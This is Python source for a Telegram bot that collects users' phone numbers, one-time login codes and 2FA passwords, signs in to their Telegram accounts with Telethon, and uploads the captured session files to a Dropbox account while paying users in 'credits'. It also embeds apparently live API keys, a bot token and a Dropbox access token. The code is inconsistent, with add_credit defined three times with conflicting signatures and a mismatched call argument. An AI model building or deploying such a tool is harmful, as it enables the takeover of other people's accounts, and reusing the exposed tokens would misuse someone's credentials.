import os
import json
import asyncio
import dropbox
from telethon import TelegramClient, errors
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, filters,
    ContextTypes, ConversationHandler
)



CREDITS_FILE = "credits.json"  # File to store user credits

# Load credits from the JSON file
def load_credits():
    if os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, 'r') as f:
            return json.load(f)
    return {}

# Save credits back to the file
def save_credits(credits_data):
    with open(CREDITS_FILE, 'w') as f:
        json.dump(credits_data, f)

# Function to add credit to the user
async def add_credit(user_id, amount):
    credits = load_credits()
    
    if user_id not in credits:
        credits[user_id] = 0
    
    credits[user_id] += amount
    save_credits(credits)
    
    return credits[user_id]  # Return the updated credit balance

# ---- Your Telegram API keys ----
API_ID = 28863669  # <-- Replace with your API ID (integer)
API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH (string)

# Your Bot Token from BotFather
BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"

# ---- Dropbox API Integration ----
DROPBOX_ACCESS_TOKEN = "sl.u.AFsiDN3tPs973d4xL9bBbHijOQum2bSocEcfAk51OK3VUcO4B3_vDR6kRZJDPIloE-RgKeIBxIBKkuaZzoAe-ePTHOMqKjYmFQlTVo1ybiz2vCpG_QcyM_qZFLcWDZ3PcBT--tQEnKyDJYwYTuRYT-kf6Gc37yo4giSqCM7wE366Oz2Ec0JJcdSjYy3xBZF7y88NyoZ47sK9XTmcvO1PqK-L-rUVk1zFr_8MJmG70_mihGBDGP7SXYGuuIll2_zSKtn4yzzhRcRNm-h6x99ZHvHyAWAaEp3nAon1EgpfZ64WQu-gJYAJrYQDAhbya4gXkHbzdxRlfWn_56a5K5xeJDtfbQBw1KsIg7GONr7uC3zWdVolZDwsNEq4qL0FKC6KdD0ZaLosFVz7bA6n-ep_Cx_edfvA6QRG-v0lGhdXzZt-zofjuYbcs7SWVPH2ImZPRyX6AwIsfUre1rR4sIOcmhGvhH4JdRT5qCwgRRkZD-V-Riv_7Vg3CKcRwMhlQPq0L3rEhNbDxeIT5E9fhAoxrzyDxbUrG27pwKzfUcEqoXGqI79AXB64MNN__okKzq1h9btS5Y4uKNasQwALCSw1TZS7rKVOUs2KI5Nt99MRM5KIetBXdmdMJSosWSYbQRs1jzQLeRsRMDPUXe8c5ihLE1d-Ot0FALQ_FPlKzzIF0F7gAcYbKq7C0eaMRYq35N8aZM9gKXpYRQU8wAkhmOkavdrjLN0UAW1r1FmhvbJz0m7OJ3KOFIQhaOqx6t88FZICCAcSpZk6JIpshEpl2OBCJzDa23h97eG498NOovgWw4suriIznIgLObcSQxot6ec8SWod_RC8hO5KIgQ6qEXuzpTEidygQkd1mk2aaT0-xwibP5Jswila_OTfEtGFKr0M_7DHBaD5nWSx84KZVqeR88FA3TCFKiSSc9ulXJTZIfMdtltkXVe-JOecekgG6YTuWTi2fQ1xjhcRs3cu4w8dPZvf23pJJmKb3WGrJYZDQBYlAvE1SdyHrzjK7I1Mzx69ZseDBsvVwvvnhrG3F_dL1G77mTkMPj-z-u7B4O-_GtwuO-Qkalr-xbBBB870Rt4obTHPcVzT9G-pCNx7En7H93uqw7y0uAs0jf47Uup60YJDybu2poTYlYdotXVAc3ln2Q5OIKBSLrSxnMGIIAn1epycX0W7vicsocMO9JJlb1O1KUcMULzpZvzqoXSQjnR9pO1P4ZcQmPoXM4eLPK5WUzWvqunNsC-T2w-kYRmoU1QQIpyKc4-FgyX_Q3muZEr8i093j50f8uHGM27AVjuVNE33bBYrgS3xrh6uiCTWyAA4sM6ZlNdKRMtJa1-AeHIaxP_VxSzcBN3AvC-cM_Mr04CZMEdesfB-vmIKTdEYkepvTHoPJBFhQJGmLfJSu5Eq_pg_y63oDK2gxrqMt4f7esvjDW90x_jFsPsstyXVeD9Rtf_Qhu9FOVTo5QGX_gmke87Tv8v8Bvfo93eyBZRgxNpp"  # <-- Replace with your Dropbox access token
dbx = dropbox.Dropbox(DROPBOX_ACCESS_TOKEN)

# ---- States for Conversation ----
ASK_PHONE, ASK_CODE, ASK_PASSWORD = range(3)

# ---- Dictionary to track users' login sessions ----
user_sessions = {}

# ---- Credits System ----
CREDITS_FILE = "credits.json"
ADMIN_USER_ID = 1155949927  # <-- Your Telegram user ID (for /allcredits access)

def load_credits():
    if os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "r") as f:
            return json.load(f)
    return {}

def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

def add_credit(user_id):
    credits = load_credits()
    credits[str(user_id)] = credits.get(str(user_id), 0) + 1
    save_credits(credits)
    upload_file_to_dropbox(CREDITS_FILE, f"/{CREDITS_FILE}")

# ---- Upload Any File to Dropbox ----
def upload_file_to_dropbox(local_path, dropbox_path):
    if not os.path.exists(local_path):
        print(f"❌ File not found: {local_path}. Skipping upload.")
        return
    with open(local_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
    print(f"✅ Uploaded {local_path} to Dropbox.")

# ---- Start Command ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Hello! Send me your phone number (with country code, e.g., +123456789).")
    return ASK_PHONE

# ---- Handle Phone Number ----
async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    user_id = update.message.from_user.id

    session_name = f"sessions/{phone}"
    os.makedirs("sessions", exist_ok=True)
    client = TelegramClient(session_name, API_ID, API_HASH)

    await client.connect()

    try:
        await client.send_code_request(phone)
        user_sessions[user_id] = {"client": client, "phone": phone}
        await update.message.reply_text("📨 OTP code sent! Please send the code you received.")
        return ASK_CODE
    except errors.PhoneNumberInvalidError:
        await update.message.reply_text("❌ Invalid phone number. Please send a valid one.")
        await client.disconnect()
        return ASK_PHONE

# ---- Handle OTP Code ----
async def ask_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    code = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]
    phone = session["phone"]

    try:
        await client.sign_in(phone, code)
        await update.message.reply_text("✅ Logged in successfully!")

        # Upload session file to Dropbox and add credit
        await upload_session_to_dropbox(client, phone, update)  # Pass the update object
        
        # Add credit and notify the user
        new_credit_balance = await add_credit(user_id, 1)  # Add 1 credit
        
        # Notify the user about the credit update
        await update.message.reply_text(f"Your account has been successfully saved to Dropbox. Your new credit balance is: {new_credit_balance} credits.")
        
        await client.disconnect()
        return ConversationHandler.END

    except errors.SessionPasswordNeededError:
        await update.message.reply_text("🔒 2FA is enabled. Please send your password.")
        return ASK_PASSWORD

    except errors.PhoneCodeInvalidError:
        # If wrong code, offer retry or skip
        reply_markup = ReplyKeyboardMarkup([["Retry", "Skip"]], one_time_keyboard=True, resize_keyboard=True)
        await update.message.reply_text("❗ Invalid OTP. Retry or Skip?", reply_markup=reply_markup)
        return ASK_CODE



# ---- Handle Retry or Skip ----
async def ask_code_retry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text == "retry":
        await update.message.reply_text("🔁 Okay, please send the code again.")
        return ASK_CODE
    else:
        user_id = update.message.from_user.id
        session = user_sessions.get(user_id)
        if session:
            await session["client"].disconnect()
            user_sessions.pop(user_id, None)
        await update.message.reply_text("⏩ Skipped. Use /start to begin again.")
        return ConversationHandler.END

# ---- Handle 2FA Password ----
async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    password = update.message.text.strip()

    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    client = session["client"]

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("✅ Logged in successfully with 2FA!")

        # Upload session file and update credits
        await upload_session_to_dropbox(client, session["phone"], user_id)

        await client.disconnect()
        return ConversationHandler.END
    except errors.PasswordHashInvalidError:
        await update.message.reply_text("❌ Incorrect password. Please send again.")
        return ASK_PASSWORD


async def add_credit(user_id, credit_amount):
    """Adds credit to a user's account and saves it."""
    file_path = "user_credits.json"
    
    # Load the existing credits data (if the file exists)
    if os.path.exists(file_path):
        with open(file_path, "r") as file:
            credits_data = json.load(file)
    else:
        credits_data = {}

    # Add the specified credit amount to the user
    if user_id in credits_data:
        credits_data[user_id] += credit_amount
    else:
        credits_data[user_id] = credit_amount

    # Save the updated credits data to the file
    with open(file_path, "w") as file:
        json.dump(credits_data, file)

# ---- Upload Session File to Dropbox and Update Credit ----
async def upload_session_to_dropbox(client, phone, update):
    """Uploads session file to Dropbox and adds credit to the user"""
    session_file_path = f"sessions/{phone}.session"  # <-- ADD ".session"
    dropbox_path = f"/sessions/{phone}.session"      # <-- ADD ".session"

    if not os.path.exists(session_file_path):
        print(f"❌ Session file not found for {phone}. Skipping upload.")
        return

    with open(session_file_path, "rb") as f:
        dbx.files_upload(f.read(), dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
        
    print(f"✅ Session file for {phone} uploaded to Dropbox.")
    
    # Add credit to the user after uploading the session
    user_id = update.message.from_user.id
    new_credit_balance = await add_credit(user_id, 1)  # Adding 1 credit as an example
    
    # Notify the user about the added credit
    await update.message.reply_text(
        f"✅ Your session for {phone} has been successfully uploaded to Dropbox!\n"
        f"💰 You have been credited 1 point. Your total credits are now: {new_credit_balance}."
    )


# ---- User Command: /credits ----
async def show_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    credits = load_credits()
    count = credits.get(str(user_id), 0)
    await update.message.reply_text(f"💳 You have {count} credit(s).")

# ---- Admin Command: /allcredits ----
async def show_all_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id != ADMIN_USER_ID:
        await update.message.reply_text("⛔ You are not authorized to view all credits.")
        return

    credits = load_credits()
    if not credits:
        await update.message.reply_text("📄 No credits data found.")
        return

    text = "📊 All Users Credits:\n\n"
    for uid, count in credits.items():
        text += f"👤 User {uid}: {count} credit(s)\n"

    await update.message.reply_text(text)

# ---- Cancel Command ----
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ Operation cancelled. Use /start to begin again.")
    return ConversationHandler.END

# ---- Main Function ----
# ---- Main Function ----
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            ASK_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_phone)],
            ASK_CODE: [
                MessageHandler(filters.Regex("^(Retry|Skip)$"), ask_code_retry),
                MessageHandler(filters.TEXT & ~filters.COMMAND, ask_code)
            ],
            ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    app.add_handler(conv_handler)

    print("Bot running...")

    # Update run_polling() with poll_interval and timeout values
    app.run_polling(poll_interval=5, timeout=30)

if __name__ == '__main__':
    asyncio.run(main())
